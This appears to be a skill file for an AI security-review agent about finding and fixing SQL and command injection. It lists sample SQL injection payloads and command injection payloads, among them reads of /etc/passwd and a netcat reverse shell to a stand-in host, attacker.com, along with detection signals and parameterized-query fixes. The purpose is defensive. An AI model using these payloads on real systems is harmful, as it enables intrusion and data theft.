---
name: injection
description: SQL, command, LDAP, and template injection — detection, attack patterns, and fixes
version: 1.0.0
family: vuln-classes
tools_allowed: [semgrep]
---

# Injection (CWE-89, CWE-78, CWE-917)

## Attacker mindset
The attacker controls a string that is interpreted as code by a downstream interpreter.
Target: exfiltrate data, bypass auth, execute OS commands, pivot to internal systems.

## SQL injection attack patterns
- Auth bypass: `' OR '1'='1' --`
- Data exfiltration: `' UNION SELECT username, password FROM users --`
- Blind boolean: `' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1) = 'a' --`
- Time-based blind: `'; WAITFOR DELAY '0:0:5' --`

## Command injection attack patterns
- Chaining: `; cat /etc/passwd`
- Subshell: `$(cat /etc/passwd)`
- Piping: `| nc attacker.com 4444 -e /bin/sh`

## Detection signals
- String concatenation/interpolation feeding a DB execute call
- `shell=True` in subprocess with any variable input
- `os.system()`, `os.popen()` with variable input
- Raw query strings in ORM `.raw()` or `.execute()` calls

## Fix pattern
Replace string interpolation with parameterized binding:
- Python: `cursor.execute("SELECT ... WHERE id = %s", (user_id,))`
- Node/pg: `client.query("SELECT ... WHERE id = $1", [userId])`
- Java/JDBC: `PreparedStatement` with `?` placeholders

## Fix validation
Run the scanner again after fix — zero injection findings on the changed file.
Attempt the auth bypass payload manually if a test endpoint exists.
